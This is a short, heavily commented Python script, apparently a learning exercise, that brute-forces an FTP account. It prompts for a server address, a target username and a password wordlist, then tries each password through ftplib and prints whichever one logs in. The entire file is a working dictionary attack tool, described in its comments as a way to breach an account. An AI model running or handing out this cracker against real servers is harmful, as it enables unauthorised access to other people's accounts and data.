#password cracker for an FTP server
#asks the user for the IP address of the FTP server and the username of the FTP account to be accessed.
#reads an external file for a list of possible passwords and tries each one in an attempt to login to the FTP account.

#import ftplib module for the FTP protocol
import ftplib

#request user to input the IP address of the FTP server
server = input("FTP server address: ")
#request user input for the username of the account to be breached
username = input("username: ")
#request user to provide path to the password list the program is going to search through
password_list = input("Path to password list: ")

#this block of code attempts to crack the password for the username supplied by the user using the password list.
#this try block filters through the password list
try:
    with open(password_list, "r") as  pw:
        for password in pw:
            #remove whitespaces
            password = password.strip("\r").strip("\n")
        #try block attempts to login into the FTP server
            try:
                ftp = ftplib.FTP(server)
                ftp.login(username,password)
            #if the combination of passsword & username succeeds, the next line is executed
                print("Success! The password is " + password)
        #if the combination of the username and password results in an error, the except block is executed and the
        #next password in the password list is used to attempt login
            except:
                print("Still trying...")
#this except block is executed if any other situaton results in an error such as an invalid path to the password list.
except:
    print("Word list error")
